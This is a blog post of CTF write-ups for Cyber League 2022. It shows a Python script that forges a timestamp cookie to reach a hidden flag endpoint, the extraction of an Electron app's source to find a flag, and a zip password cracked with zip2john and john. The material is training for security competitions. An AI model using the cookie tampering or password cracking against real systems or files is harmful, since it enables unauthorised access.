<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Cyber League CTF 2022 - Writeups 🚩" /><meta property="og:locale" content="en" /><meta name="description" content="Didn’t really have much time to tackle a lot of the challenges with this CTF and only managed to pwn 3 of them. A big shoutout to my team mates Mocha and Dante for a lot of initial enumerations! I just mainly followed their leads 😅" /><meta property="og:description" content="Didn’t really have much time to tackle a lot of the challenges with this CTF and only managed to pwn 3 of them. A big shoutout to my team mates Mocha and Dante for a lot of initial enumerations! I just mainly followed their leads 😅" /><link rel="canonical" href="https://brootware.github.io/posts/cyber-league-ctf-2022-writeups/" /><meta property="og:url" content="https://brootware.github.io/posts/cyber-league-ctf-2022-writeups/" /><meta property="og:site_name" content="(B)rootware Research" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-02T10:16:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Cyber League CTF 2022 - Writeups 🚩" /><meta name="twitter:site" content="@brootware" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"dateModified":"2022-05-03T08:49:23+08:00","datePublished":"2022-05-02T10:16:00+08:00","description":"Didn’t really have much time to tackle a lot of the challenges with this CTF and only managed to pwn 3 of them. A big shoutout to my team mates Mocha and Dante for a lot of initial enumerations! I just mainly followed their leads 😅","mainEntityOfPage":{"@type":"WebPage","@id":"https://brootware.github.io/posts/cyber-league-ctf-2022-writeups/"},"url":"https://brootware.github.io/posts/cyber-league-ctf-2022-writeups/","@type":"BlogPosting","headline":"Cyber League CTF 2022 - Writeups 🚩","@context":"https://schema.org"}</script><title>Cyber League CTF 2022 - Writeups 🚩 | (B)rootware Research</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="(B)rootware Research"><meta name="application-name" content="(B)rootware Research"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/7734956?v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">(B)rootware Research</a></div><div class="site-subtitle font-italic">Cloud DevOps / Site Reliability Engineering, Cyber Security</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/brootware" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/brootware" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/oakermin" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Cyber League CTF 2022 - Writeups 🚩</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Cyber League CTF 2022 - Writeups 🚩</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/brootware">Oaker Min (Bruce)</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-05-02 10:16:00 +0800" data-toggle="tooltip" data-placement="bottom" title="Mon, May 2, 2022, 10:16 AM +0800" >May 2, 2022</em> </span> <span> Updated <em class="timeago" date="2022-05-03 08:49:23 +0800 " data-toggle="tooltip" data-placement="bottom" title="Tue, May 3, 2022, 8:49 AM +0800" >May 3, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="950 words"> <em>5 min</em> read</span></div></div></div><div class="post-content"><blockquote><p>Didn’t really have much time to tackle a lot of the challenges with this CTF and only managed to pwn 3 of them. A big shoutout to my team mates Mocha and Dante for a lot of initial enumerations! I just mainly followed their leads 😅</p></blockquote><h2 id="simulated-bomb-drill">Simulated bomb drill<a href="#simulated-bomb-drill" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>This is the first challenge for the web category in cyber league’s CTF. A web endpoint is given for us to start enumerating. When you first hit the main page you are issued a base64 encoded cookie that contains the time in the following format.</p><pre><code class="language-txt">2022-05-01 12:41:35.329922
</code></pre><p>From the time format given above, note that there are microseconds. This was missed initially as our team enumerates for possible way to exploit this cookie. During the initial request to the main page and by the time the cookie is issued, a few microseconds have already passed.</p><p><img data-src="https://bn1304files.storage.live.com/y4m4NKAA6TjHq4cvH4qK3FLr6jSkGSSZKUbekVgqo8YhCrpC_iqsHaYPcLHrQ-aIT8r-cyL03phkYBX1lD8Gy8CwdR-cwp6OeUlHVBQKhh1VBK7XTISZo4FdvkIszcMYMKEpFNAQlA8exKP3Y1yEMPZZzuAqMwgYlJPJ4vTv8rpQjfNnTxcHCnJu__1d7CCL_NP?width=2280&amp;height=1068&amp;cropmode=none" alt="blown" data-proofer-ignore></p><p>Above is an illustration of the time line. So</p><ul><li>If you visit with the issued cookie under a minute to <code class="language-plaintext highlighter-rouge">/defuse</code> page, you will fail.<li>If you also modified the cookie to be one minute earlier, you will still fail.</ul><p><img data-src="https://bn1304files.storage.live.com/y4mSu5_wHVLBsroBYQUT9z97CIOX7BLmmwLCzSZhe_sArd5JxbUMIiMDl2K8Q3IXyFsXcjcSbzcholSUdVS-27Ley7PHhZ4KOi6DakV7SyUH-VEbfN6-vyKfSb_EzWxYAKbV8wdjinV1r2p6gDtPw7ewWrHjwmZR2V_DXI2cT-YN0OwDXizBEpOAHs1IoZyYsN2?width=2872&amp;height=936&amp;cropmode=none" alt="cookie" data-proofer-ignore></p><p>The above is the screenshot of the main page with issued cookie.</p><p>Since the bomb needs to be defused with 0 microseconds passed from the time of request (not the time of cookie issued), it is physically impossible to do this by hand. So the best way is to script this out in python. The algorithm to get the flag endpoint is as below.</p><ol><li>Decode the base64 time from cookie<li>Measure the time elasped from the first request<li>Minus off the time elasped from the cookie time<li>Encode the new time into the cookie and send the request</ol><p>We can code the above steps as below in python.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>

<span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://13.213.72.54:5003/'</span><span class="p">)</span>

<span class="c1"># Get time elapsed in microseconds
</span><span class="n">time_elapsed</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">elapsed</span>
<span class="n">time_elapsed</span> <span class="o">=</span> <span class="n">time_elapsed</span><span class="p">.</span><span class="n">total_seconds</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">elapsed</span><span class="p">)</span>
<span class="c1"># 0:00:00.019976
</span>

<span class="n">time_to_decode</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="n">get_dict</span><span class="p">()[</span><span class="s">'princesspeach'</span><span class="p">]</span>
<span class="n">decoded_datetime</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">time_to_decode</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
<span class="c1"># '2022-05-01 12:41:35.329922'
</span><span class="n">decoded_time</span> <span class="o">=</span> <span class="n">decoded_datetime</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)</span>
<span class="c1"># ['2022-05-01 12:41:35', '308641']
</span><span class="n">decoded_microseconds</span> <span class="o">=</span> <span class="n">decoded_datetime</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
<span class="c1"># '329922'
</span><span class="n">decoded_microseconds_in_seconds</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">decoded_microseconds</span><span class="p">)</span><span class="o">/</span><span class="mi">1000000</span>
<span class="c1"># 0.329922
</span>
<span class="n">new_time</span> <span class="o">=</span> <span class="n">decoded_microseconds_in_seconds</span> <span class="o">-</span> <span class="n">time_elapsed</span>
<span class="n">new_time_in_microseconds</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">new_time</span> <span class="o">*</span> <span class="mi">1000000</span><span class="p">)</span>
<span class="c1"># 308641
</span>
<span class="n">decoded_time</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">new_time_in_microseconds</span><span class="p">)</span>

<span class="n">to_encode</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">decoded_time</span><span class="p">)</span>
<span class="c1"># '2022-05-01 12:41:35308641'
</span><span class="n">encoded_time</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">to_encode</span><span class="p">,</span> <span class="s">'utf-8'</span><span class="p">))</span>
<span class="c1"># b'MjAyMi0wNS0wMSAxMjo0MTozNTMwODY0MQ=='
</span>
<span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">[</span><span class="s">'princesspeach'</span><span class="p">]</span> <span class="o">=</span> <span class="n">encoded_time</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://13.213.72.54:5003/defuse'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>

<span class="s">""" &gt;&gt;&gt; print(res.content)
b'&lt;!DOCTYPE html&gt;</span><span class="se">\n</span><span class="s">&lt;html&gt;</span><span class="se">\n</span><span class="s">&lt;head&gt;</span><span class="se">\n</span><span class="s"> &lt;title&gt;&lt;/title&gt;</span><span class="se">\n</span><span class="s"> &lt;meta charset="utf-8" /&gt;</span><span class="se">\n</span><span class="s">&lt;/head&gt;&lt;body&gt;</span><span class="se">\n</span><span class="s">&lt;div class="bd-example" align="middle"&gt;</span><span class="se">\n\n</span><span class="s">&lt;img src="/static/712a8b4446afb5d43da0dea63cd1c13b.jpg"align="middle" /&gt;</span><span class="se">\n\n</span><span class="s">&lt;/div&gt;</span><span class="se">\n</span><span class="s">&lt;/body&gt;</span><span class="se">\n</span><span class="s">&lt;/html&gt;' """</span>
</pre></table></code></div></div><p>We managed the get the flag endpoint like below.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"/static/712a8b4446afb5d43da0dea63cd1c13b.jpg"</span><span class="na">align=</span><span class="s">"middle"</span> <span class="nt">/&gt;</span>
</pre></table></code></div></div><p>Visit the endpoint and you will be able to get the flag.</p><p><img data-src="https://bn1304files.storage.live.com/y4mZLD6Ua4apnvDZjqDKWnzRFYFCsqkIm-c1GpA0_AMbdm8vp3qwR27yEkIssKJ7iVkcQPPeGryziw-4e9dC8ijsw2-9RCFGbeAh2HgFtWampNx94gZwH8shXi-siMMX_zED4XYBtEAK_3YmXvxVFxWW57iEateBhtfOiB2jNQvlDfcHdMH56ycnRwfyLyml9sL?width=533&amp;height=496&amp;cropmode=none" alt="flag" data-proofer-ignore></p><h2 id="write-farewell-letters">Write farewell letters<a href="#write-farewell-letters" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>This challenge is the misc category of the CTF. 3 types of installation files are given with flag hidden. <code class="language-plaintext highlighter-rouge">.dmg</code> <code class="language-plaintext highlighter-rouge">.exe</code> and <code class="language-plaintext highlighter-rouge">.appimage</code>. You simply have to run them to get the binary file to run the application.</p><p>The application is doing nothing much but hiding and showing the message as below.</p><p><img data-src="https://bn1304files.storage.live.com/y4mZ-4GT0gAj1OIaP2vgKopCFYLmbTMW8CMGiceqQjOIwTQL0jeezJSFWnsU8vNcWb2IA1NLW1WUZeqImILtFu6mtkrruZJ4DtSDBnp1koFd2k53r1e21PRsADdcbgQcWy8qldFQYQxq27_IYZb1rMjxFepvAyrMrl09F1yJoxynd_FY1QcFtynnFrzfwDQdO1k?width=1134&amp;height=1344&amp;cropmode=none" alt="yoda" data-proofer-ignore></p><p>I had my suspicion that this could be an electron app. To decompile it we can use npm’s asar to extract the source code. Below is the capture of how i extracted out the electron source code.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>➜  cyleague <span class="nb">cd </span>peekaboo.app 
➜  peekaboo.app <span class="nb">cd </span>Contents 
➜  Contents <span class="nb">cd </span>Resources 
➜  Resources <span class="nb">ls
</span>am.lproj      de.lproj      <span class="k">fi</span>.lproj      id.lproj      mr.lproj      ro.lproj      te.lproj
app.asar      el.lproj      fil.lproj     it.lproj      ms.lproj      ru.lproj      th.lproj
ar.lproj      en.lproj      fr.lproj      ja.lproj      nb.lproj      sk.lproj      tr.lproj
bg.lproj      en_GB.lproj   gu.lproj      kn.lproj      nl.lproj      sl.lproj      uk.lproj
bn.lproj      es.lproj      he.lproj      ko.lproj      peekaboo.icns sr.lproj      vi.lproj
ca.lproj      es_419.lproj  hi.lproj      lt.lproj      pl.lproj      sv.lproj      zh_CN.lproj
cs.lproj      et.lproj      hr.lproj      lv.lproj      pt_BR.lproj   sw.lproj      zh_TW.lproj
da.lproj      fa.lproj      hu.lproj      ml.lproj      pt_PT.lproj   ta.lproj
➜  Resources <span class="nb">mkdir </span>decompile-electron
➜  Resources asar extract app.asar decompile-electron 
➜  Resources <span class="nb">cd </span>decompile-electron 
➜  decompile-electron code <span class="nb">.</span>
</pre></table></code></div></div><p>After decompiling, we open the source code in electron to analyse. From root folder navigate to js folder to index.js as below.</p><p><code class="language-plaintext highlighter-rouge">In js &gt; index.js</code></p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">visibilitySetting</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">hidden</span><span class="dl">'</span>

<span class="kd">function</span> <span class="nx">load</span><span class="p">()</span> <span class="p">{</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">showButton</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">show</span><span class="dl">'</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">showVersions</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">visibilitySetting</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">visible</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">visibilitySetting</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">hidden</span><span class="dl">'</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">versions</span><span class="dl">'</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">visibility</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">hidden</span><span class="dl">'</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">showButton</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">show</span><span class="dl">'</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="nx">visibilitySetting</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">visible</span><span class="dl">'</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">versions</span><span class="dl">'</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">visibility</span> <span class="o">=</span><span class="dl">'</span><span class="s1"> visible</span><span class="dl">'</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">showButton</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">hide</span><span class="dl">'</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">shinyKnob</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">CYBERLEAGUE{7h3_cu73n355_15_5720n9_w17h_7h15_0n3}</span><span class="dl">'</span><span class="p">)</span>
<span class="p">}</span>
</pre></table></code></div></div><h2 id="understand-space-politics">Understand space politics<a href="#understand-space-politics" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>This is a forensics challenge where challengers are given a <code class="language-plaintext highlighter-rouge">.7z</code> file with flag text underneath. The challenge is straightfoward to crack the zip file password to get the flag. Below is the capture of using zip2john to crack the zip file.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents]
└─<span class="nv">$ </span>zip2john hello_there.zip <span class="o">&gt;</span> ziphashes
ver 2.0 hello_there.zip/hello_there.txt PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>41, <span class="nv">decmplen</span><span class="o">=</span>29, <span class="nv">crc</span><span class="o">=</span>87D14E54 <span class="nv">ts</span><span class="o">=</span>A8AF <span class="nv">cs</span><span class="o">=</span>87d1 <span class="nb">type</span><span class="o">=</span>0
                                                       
┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents]
└─<span class="nv">$ </span><span class="nb">cat </span>ziphashes 
hello_there.zip/hello_there.txt:<span class="nv">$pkzip$1</span><span class="k">*</span>1<span class="k">*</span>2<span class="k">*</span>0<span class="k">*</span>29<span class="k">*</span>1d<span class="k">*</span>87d14e54<span class="k">*</span>0<span class="k">*</span>2d<span class="k">*</span>0<span class="k">*</span>29<span class="k">*</span>87d1<span class="k">*</span>8facba0e3e10e650ad9dc1fc89e000dfcff60fe4858a519eb33e8f1f9380a9633f39729fb0e101c9eb<span class="k">*</span><span class="nv">$/</span>pkzip<span class="nv">$:</span>hello_there.txt:hello_there.zip::hello_there.zip
                                                       
┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents]
└─<span class="nv">$ </span>john ziphashes 
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Almost <span class="k">done</span>: Processing the remaining buffered candidate passwords, <span class="k">if </span>any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
2hot4u           <span class="o">(</span>hello_there.zip/hello_there.txt<span class="o">)</span>     
1g 0:00:00:02 DONE 3/3 <span class="o">(</span>2022-05-01 09:13<span class="o">)</span> 0.3521g/s 2067Kp/s 2067Kc/s 2067KC/s cjjlip..2hul83
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed. 
</pre></table></code></div></div><p>The password is <code class="language-plaintext highlighter-rouge">2hot4u</code> to extract out the flag.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents]
└─<span class="nv">$ </span>unzip hello_there.zip 
Archive:  hello_there.zip
<span class="o">[</span>hello_there.zip] hello_there.txt password: 
 extracting: hello_there.txt         
                                                       
┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents]
└─<span class="nv">$ </span><span class="nb">cat </span>hello_there.txt 
CYBERLEAGUE<span class="o">{</span>Y0U_Fo|_|nD_3e!<span class="o">}</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/web-exploitation/'>Web-exploitation</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/web-exploitation/" class="post-tag no-text-decoration" >Web-exploitation</a> <a href="/tags/forensics/" class="post-tag no-text-decoration" >Forensics</a> <a href="/tags/cyber-league/" class="post-tag no-text-decoration" >Cyber-League</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Cyber League CTF 2022 - Writeups 🚩 - (B)rootware Research&url=https://brootware.github.io/posts/cyber-league-ctf-2022-writeups/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Cyber League CTF 2022 - Writeups 🚩 - (B)rootware Research&u=https://brootware.github.io/posts/cyber-league-ctf-2022-writeups/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://brootware.github.io/posts/cyber-league-ctf-2022-writeups/&text=Cyber League CTF 2022 - Writeups 🚩 - (B)rootware Research" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://brootware.github.io/posts/cyber-league-ctf-2022-writeups/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 